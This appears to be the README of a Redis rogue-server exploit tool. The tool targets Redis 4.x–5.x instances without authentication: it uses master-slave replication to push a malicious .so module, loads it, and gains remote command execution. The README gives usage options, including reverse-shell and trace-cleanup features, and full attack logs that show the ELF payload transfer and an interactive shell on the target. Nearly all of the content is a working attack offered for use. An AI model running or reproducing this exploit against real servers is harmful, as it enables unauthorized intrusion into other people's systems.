### Awesome Redis Rogue Server Research

This document details research on the **Redis Rogue Server** technique for exploiting Redis instances with unauthorized access. Existing articles often lack a detailed explanation of its principles, so this study dives deeper, improving the existing `Rogue Server` Python exploitation code and `module.c` source code.

The core technologies involved are **Redis master-slave replication** and **external module loading**, with the attack strategy summarized as follows:

![Redis Rogue Server Diagram](https://i.loli.net/2019/12/20/KfcrkUu89joGe34.png)

---

### Features for Red Team Testing

- Rewritten external module memory allocation to avoid crashing the tested Redis server.
- More stable direct shell and reverse shell options.
- Separate `Rogue Server` mode.
- `Redis-Cli` and `Rogue Server` separation mode.
- Writable path testing.
- Standard error redirection.
- Optimized shell decoding issues.
- Randomized `.so` file names and module load names.
- Module unloading and `.so` file cleanup to maintain server functionality.
- Redis password authentication support (details in source code).

---

### Applicability
Compatible with **Redis 4.x to 5.x**.

---

### Usage

```bash
$ python3 redis_rogue_server.py -h

usage: python3 redis_rogue_server.py -rhost [target_ip] -lhost [rogue_ip] [Extend options]

Redis unauthenticated test tool.

optional arguments:
  -h, --help      show this help message and exit
  -rhost RHOST    Target host.
  -rport RPORT    Target port. [default: 6379]
  -lhost LHOST    Rogue Redis server, which the target host can reach. THIS IP MUST BE ACCESSIBLE BY THE TARGET!
  -lport LPORT    Rogue Redis server listening port. [default: 15000]
  -passwd PASSWD  Target Redis password.
  -path SO_PATH   "Evil" .so file path. [default: module.so]
  -t RTIMEOUT     Rogue server response timeout. [default: 3]
  -s              Separate mode: separates Redis-Cli (this IP) and Rogue Server (another IP).
                  Rogue Server port listens locally by default. Use flag `-s` to shut down local port if `lport` conflicts.
  -v              Verbose mode.

Examples:
  redis_rogue_server.py -rhost 192.168.0.1 -lhost 192.168.0.2
  redis_rogue_server.py -rhost 192.168.0.1 -lhost 192.168.0.2 -rport 6379 -lport 15000

Only Rogue Server Mode:
  redis_rogue_server.py -v
```

---

### Example Usage

```bash
$ python3 redis_rogue_server.py -rhost 192.168.229.136 -lhost 192.168.229.150 -v
[*] Init connection...
[+] Target accessible!
[*] Exploit Step-1.
[+] RDB dir: /home/test/Desktop/redis-5.0.7
[*] Done.
[+] Accept connection from 192.168.229.136:44674
[>>]b'*1\r\n$4\r\nPING\r\n'
[<<]b'+PONG\r\n'
[>>]b'*3\r\n$8\r\nREPLCONF\r\n$14\r\nlistening-port\r\n$4\r\n6379\r\n'
[<<]b'+OK\r\n'
[>>]b'*5\r\n$8\r\nREPLCONF\r\n$4\r\ncapa\r\n$3\r\neof\r\n$4\r\ncapa\r\n$6\r\npsync2\r\n'
[<<]b'+OK\r\n'
[>>]b'*3\r\n$5\r\nPSYNC\r\n$40\r\ne46ef23509ec51bb952dec34cb84e6c08388e5eb\r\n$1\r\n1\r\n'
[<<]b'+FULLRESYNC d2b79a2fbd16c050cdf136838f67093efb76509 1\r\n$45608\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00 *\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00...'
[*] The Rogue Server Finished Sending the Fake Master Response.
[*] Wait for Redis IO and transaction flow to close...
[*] Exploit Step-2.
[*] Done.
[+] It may crash the target Redis server due to large data transfer. Be careful.
[?] Shell? [i]interactive,[r]reverse: i
[!] DO NOT USE THIS TOOL FOR MALICIOUS PURPOSES!
[+] =========================== Shell =============================
$ id
uid=1000(test) gid=1000(test) groups=1000(test),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
$ exit
[*] Please wait for auto exit. Cleaning....
[!] DO NOT SHUTDOWN IMMEDIATELY!
[*] Done.
```

---

### Separate Mode

- **Rogue Server:** `192.168.229.150`
- **Attacker:** `192.168.229.136`

In this mode, the `Rogue Server` is run separately from the attacker host's `Redis-Cli`. First, start the `Rogue Server`. Then, the attacker's `Redis-Cli` sends attack commands. The `Rogue Server` is hosted on a remote machine and doesn't run locally.

#### Rogue Server
```bash
python3 ./redis_rogue_server.py -v
[*] Listening on port: 15000
[+] Accept connection from 192.168.229.136:44762
[>>]b'*1\r\n$4\r\nPING\r\n'
[<<]b'+PONG\r\n'
[>>]b'*3\r\n$8\r\nREPLCONF\r\n$14\r\nlistening-port\r\n$4\r\n6379\r\n'
[<<]b'+OK\r\n'
[>>]b'*5\r\n$8\r\nREPLCONF\r\n$4\r\ncapa\r\n$3\r\neof\r\n$4\r\ncapa\r\n$6\r\npsync2\r\n'
[<<]b'+OK\r\n'
[>>]b'*3\r\n$5\r\nPSYNC\r\n$40\r\na62cf45a906d4a68422cac6f835108dbecb25f3b\r\n$1\r\n1\r\n'
[<<]b'+FULLRESYNC b79062efe2211aa8328ab4da3d501fa21b2ac54a 1\r\n$45608\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00 *\x00\x00\x00\x00\x00\x00@\x00\x00\x00...'
[*] Wait for Redis IO and transaction flow to close...
```

#### Attacker
```bash
python3 redis_rogue_server.py -rhost 192.168.229.136 -lhost 192.168.229.150 -s -v
[*] Separate Mode. Please ensure your Rogue Server is listening.
[*] Init connection...
[+] Target accessible!
[*] Exploit Step-1.
[+] RDB dir: /home/test/Desktop/redis-5.0.7
[*] Done.
[*] Wait 3 secs for REMOTE Rogue Server response. (Use flag -t [N] to change timeout)
[!] Ensure your remote Rogue Server is working now!
[*] Exploit Step-2.
[*] Done.
[+] It may crash the target Redis server due to large data transfer. Be careful.
[?] Shell? [i]interactive,[r]reverse: i
[!] DO NOT USE THIS TOOL FOR MALICIOUS PURPOSES!
[+] =========================== Shell =============================
$ id
uid=1000(test) gid=1000(test) groups=1000(test),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
$ exit
```

---

### Module Source Code Modifications

Modify the `RedisModules/src/module.c` file and recompile:

```bash
$ vim ./RedisModules/src/module.c
$ cd RedisModules
$ make
```
---

### Disclaimer
This project is for security research and learning purposes only. Please comply with local laws and regulations. Any misuse is the sole responsibility of the user. **Use it only for research purposes.**
